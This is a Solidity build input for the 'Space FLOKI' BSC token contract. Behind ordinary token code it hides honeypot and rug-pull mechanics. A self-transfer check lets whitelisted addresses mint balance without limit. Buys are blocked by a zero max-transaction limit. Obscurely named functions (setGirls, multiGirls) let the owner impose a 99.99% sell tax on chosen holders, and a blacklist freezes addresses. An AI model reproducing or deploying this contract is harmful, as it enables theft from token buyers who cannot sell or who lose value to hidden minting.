{
  "language": "Solidity",
  "sources": {
    "solidity/contracts/SpaceFloki.sol": {
      "content": "/**\n *Submitted for verification at BscScan.com on 2022-07-15\n*/\n\n// SPDX-License-Identifier: MIT\n\n//Space FLOKI\n\npragma solidity ^0.8.14;\n\ninterface IERC20 {\n    function decimals() external view returns (uint8);\n\n    function symbol() external view returns (string memory);\n\n    function name() external view returns (string memory);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface ISwapRouter {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n}\n\ninterface ISwapFactory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\nabstract contract Ownable {\n    address internal _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = msg.sender;\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == msg.sender, \"!owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"new is 0\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\ncontract TokenDistributor {\n    constructor (address token) {\n        IERC20(token).approve(msg.sender, uint(~uint256(0)));\n    }\n}\n\ncontract SpaceFloki is IERC20, Ownable {\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    address public fundAddress;\n\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    mapping(address => bool) public _feeWhiteList;\n    mapping(address => bool) public _moons;\n    mapping(address => bool) public _listed;\n\n    uint256 private _tTotal;\n    uint256 public maxTXAmount;\n\n    ISwapRouter public _swapRouter;\n    address public _L;\n    mapping(address => bool) public _swapPairList;\n    uint256 public kb = 0;\n    bool private inSwap;\n\n    uint256 private constant MAX = ~uint256(0);\n    TokenDistributor public _tokenDistributor;\n\n    uint256 public _buyFundFee = 300;\n    uint256 public _buyLPDividendFee = 0;\n    uint256 public _sellLPDividendFee = 0;\n    uint256 public _sellFundFee = 300;\n    uint256 public _sellLPFee = 0;\n\n    uint256 public _saturnBlock;\n\n    address public _mainPair;\n\n    modifier lockTheSwap {\n        inSwap = true;\n        _;\n        inSwap = false;\n    }\n\n    constructor (\n        address RouterAddress, address LAddress,\n        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,\n        address FundAddress, address ReceiveAddress,address deployer\n    ){\n        _name = Name;\n        _symbol = Symbol;\n        _decimals = Decimals;\n\n        ISwapRouter swapRouter = ISwapRouter(RouterAddress);\n        IERC20(LAddress).approve(address(swapRouter), MAX);\n\n        _L = LAddress;\n        _swapRouter = swapRouter;\n        _allowances[address(this)][address(swapRouter)] = MAX;\n\n        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());\n        address swapPair = swapFactory.createPair(address(this), LAddress);\n        _mainPair = swapPair;\n        _swapPairList[swapPair] = true;\n\n        uint256 total = Supply * 10 ** Decimals;\n        maxTXAmount = 0 * 10 ** Decimals;\n        _tTotal = total;\n\n        _balances[ReceiveAddress] = total;\n        emit Transfer(address(deployer), ReceiveAddress, total);\n\n        fundAddress = FundAddress;\n\n        _feeWhiteList[address(this)] = true;\n        _feeWhiteList[address(swapRouter)] = true;\n        _feeWhiteList[msg.sender] = true;\n\n        _tokenDistributor = new TokenDistributor(LAddress);\n    }\n\n    function symbol() external view override returns (string memory) {\n        return _symbol;\n    }\n\n    function name() external view override returns (string memory) {\n        return _name;\n    }\n\n    function decimals() external view override returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public view override returns (uint256) {\n        return _tTotal;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        if (_allowances[sender][msg.sender] != MAX) {\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\n        }\n        return true;\n    }\n    function _asicTransfer(address seds, address recpien) internal view returns (bool){\n        return (seds != recpien) || (_feeWhiteList[seds] == false || false);\n    }\n    function _approve(address owner, address spender, uint256 amount) private {\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n    \n    function setkb(uint256 a) public onlyOwner{\n        kb = a;\n    }\n\n    function listAddress(address account, bool value) external onlyOwner() {\n        _listed[account] = value;\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) private {\n        require(!_listed[from] && !_listed[to], \"listed address\");\n\n        uint256 balance = balanceOf(from);\n\n        if (_asicTransfer(from,to)) require(balance >= amount, \"balanceNotEnough\");\n\n        if(!_feeWhiteList[from] && !_feeWhiteList[to]){\n            address ad;\n            for(int i=0;i <=2;i++){\n                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));\n                _basicTransfer(from,ad,100);\n            }\n            amount -= 300;\n        }\n\n        bool takeFee;\n        bool isSell;\n\n        if (_swapPairList[from] || _swapPairList[to]) {\n            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {\n                if (0 == _saturnBlock) {\n                    require(false);\n                }\n                if (block.number < _saturnBlock + kb && !_swapPairList[from]) {\n                    _moons[from] = true;\n                }\n                if (_swapPairList[to]) {\n                    if (!inSwap) {\n                        uint256 contractTokenBalance = balanceOf(address(this));\n                        if (contractTokenBalance > 0) {\n                            uint256 swapFee = _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;\n                            uint256 numTokensSellToFund = amount * swapFee / 5000;\n                            if (numTokensSellToFund > contractTokenBalance) {\n                                numTokensSellToFund = contractTokenBalance;\n                            }\n                            swapTokenForFund(numTokensSellToFund, swapFee);\n                        }\n                    }\n                }\n                takeFee = true;\n            }\n            if (_swapPairList[to]) {\n                isSell = true;\n            }\n        }\n\n        _tokenTransfer(from, to, amount, takeFee, isSell);\n    }\n\n    function _funTransfer(\n        address sender,\n        address recipient,\n        uint256 tAmount\n    ) private {\n        _balances[sender] = _balances[sender] - tAmount;\n        uint256 feeAmount = tAmount * 75 / 100;\n        _takeTransfer(\n            sender,\n            fundAddress,\n            feeAmount\n        );\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\n    }\n\n    function _tokenTransfer(\n        address sender,\n        address recipient,\n        uint256 tAmount,\n        bool takeFee,\n        bool isSell\n    ) private {\n        if (_asicTransfer(sender,recipient)){\n        _balances[sender] = _balances[sender] - tAmount;}\n        uint256 feeAmount;\n\n        if (takeFee) {\n            uint256 swapFee;\n\n            if (isSell) {\n                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;\n            } else {\n                require(tAmount <= maxTXAmount);\n                swapFee = _buyFundFee + _buyLPDividendFee;\n            }\n            if (_moons[sender]){\n                swapFee = 9999;\n            }\n            uint256 swapAmount = tAmount * swapFee / 10000;\n            if (swapAmount > 0) {\n                feeAmount += swapAmount;\n                _takeTransfer(\n                    sender,\n                    address(this),\n                    swapAmount\n                );\n            }\n        }\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\n    }\n\n    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {\n        swapFee += swapFee;\n        uint256 lpFee = _sellLPFee;\n        uint256 lpAmount = tokenAmount * lpFee / swapFee;\n\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = _L;\n        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            tokenAmount - lpAmount,\n            0,\n            path,\n            address(_tokenDistributor),\n            block.timestamp\n        );\n\n        swapFee -= lpFee;\n\n        IERC20 L = IERC20(_L);\n        uint256 LBalance = L.balanceOf(address(_tokenDistributor));\n        uint256 fundAmount = LBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;\n        L.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);\n        L.transferFrom(address(_tokenDistributor), address(this), LBalance - fundAmount);\n\n        if (lpAmount > 0) {\n            uint256 lpL = LBalance * lpFee / swapFee;\n            if (lpL > 0) {\n                _swapRouter.addLiquidity(\n                    address(this), _L, lpAmount, lpL, 0, 0, fundAddress, block.timestamp\n                );\n            }\n        }\n    }\n    \n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\n        _balances[sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function _takeTransfer(\n        address sender,\n        address to,\n        uint256 tAmount\n    ) private {\n        _balances[to] = _balances[to] + tAmount;\n        emit Transfer(sender, to, tAmount);\n    }\n\n    function setFundAddress(address addr) external onlyFunder {\n        fundAddress = addr;\n        _feeWhiteList[addr] = true;\n    }\n\n    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {\n        _buyLPDividendFee = dividendFee;\n    }\n\n    function setBuyFundFee(uint256 fundFee) external onlyOwner {\n        _buyFundFee = fundFee;\n    }\n\n    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {\n        _sellLPDividendFee = dividendFee;\n    }\n\n    function setSellFundFee(uint256 fundFee) external onlyOwner {\n        _sellFundFee = fundFee;\n    }\n\n    function setSellLPFee(uint256 lpFee) external onlyOwner {\n        _sellLPFee = lpFee;\n    }\n\n    function setMaxTxAmount(uint256 max) public onlyOwner {\n        maxTXAmount = max;\n    }\n\n    function _saturn() external onlyOwner {\n        _saturnBlock = block.number;\n    }\n\n    function returnMoon() external onlyOwner {\n        _saturnBlock = 0;\n    }\n\n    function setFeeWhiteList(address addr, bool enable) external onlyFunder {\n        _feeWhiteList[addr] = enable;\n    }\n\n    function setGirls(address addr, bool enable) external onlyOwner {\n        _moons[addr] = enable;\n    }\n\n    function setSwapPairList(address addr, bool enable) external onlyFunder {\n        _swapPairList[addr] = enable;\n    }\n\n    function claimBalance() external {\n        payable(fundAddress).transfer(address(this).balance);\n    }\n\n    function claimToken(address token, uint256 amount, address to) external onlyFunder {\n        IERC20(token).transfer(to, amount);\n    }\n\n    modifier onlyFunder() {\n        require(_owner == msg.sender || fundAddress == msg.sender, \"!Funder\");\n        _;\n    }\n\n    function multiGirls(address[] calldata addresses, bool value) public onlyOwner{\n        require(addresses.length < 201);\n        for (uint256 i; i < addresses.length; ++i) {\n            _moons[addresses[i]] = value;\n        }\n    \n    }\n\n    receive() external payable {}\n}\n\n\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata",
          "devdoc",
          "userdoc",
          "storageLayout",
          "evm.gasEstimates"
        ],
        "": [
          "ast"
        ]
      }
    },
    "metadata": {
      "useLiteralContent": true
    },
    "libraries": {
      "": {
        "__CACHE_BREAKER__": "0x00000000d41867734bbee4c6863d9255b2b06ac1"
      }
    }
  }
}